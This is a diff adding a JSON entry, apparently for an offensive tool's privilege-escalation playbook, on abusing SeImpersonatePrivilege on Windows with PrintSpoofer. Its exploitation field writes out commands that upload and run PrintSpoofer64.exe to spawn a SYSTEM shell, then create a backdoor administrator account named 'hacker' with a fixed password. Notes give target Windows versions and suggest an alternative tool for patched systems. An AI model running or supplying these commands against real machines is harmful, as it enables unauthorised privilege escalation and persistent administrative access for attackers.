@@ -1,0 +1,16 @@
+{
+  "id": "win_seimpersonate_printspoofer",
+  "category": "WIN_TOKEN_PRIV",
+  "binary": null,
+  "cve": null,
+  "exploitation": [
+    "upload <id> /path/to/PrintSpoofer64.exe",
+    "exec <id> C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c cmd",
+    "exec <id> C:\\Windows\\Temp\\PrintSpoofer64.exe -c \"net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add\""
+  ],
+  "post_exploit": ["exec <id> whoami"],
+  "notes": "Targets Windows 10/Server 2019 and older. Requires SeImpersonatePrivilege. May not work on fully patched Server 2022. Prefer GodPotato for newer targets.",
+  "source": "github.com/itm4n/PrintSpoofer",
+  "tags": ["windows", "seimpersonate", "spooler", "token"],
+  "severity": "high"
+}
